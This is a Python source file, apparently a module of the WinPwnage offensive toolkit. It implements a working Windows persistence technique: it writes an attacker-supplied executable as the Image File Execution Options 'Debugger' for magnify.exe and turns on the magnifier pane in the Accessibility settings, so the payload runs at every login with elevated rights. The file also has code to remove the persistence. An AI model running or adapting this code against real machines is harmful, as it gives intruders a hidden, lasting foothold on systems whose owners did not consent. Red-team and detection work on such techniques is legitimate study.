from winpwnage.core.prints import *
from winpwnage.core.utils import *

ifeo_info = {
	"Description": "Gain persistence using IFEO debugger registry key",
	"Id": "4",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "ifeo",
	"Function Payload": True,
}


def ifeo(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if "64" in information().architecture():
		magnify_key = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
	else:
		magnify_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"

	accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"

	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=payload, create=True):
				print_success("Successfully created Debugger key containing payload ({})".format(payload))
				if registry().modify_key(hkey="hklm", path=accessibility_key, name="Configuration", value="magnifierpane", create=True):
					print_success("Successfully installed persistence, payload will run at login")
					return True
			print_error("Unable to install persistence")
			return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
			if registry().remove_key(hkey="hklm", path=magnify_key, delete_key=True):
				print_success("Successfully removed persistence")
				return True

		print_error("Unable to remove persistence")
		return False
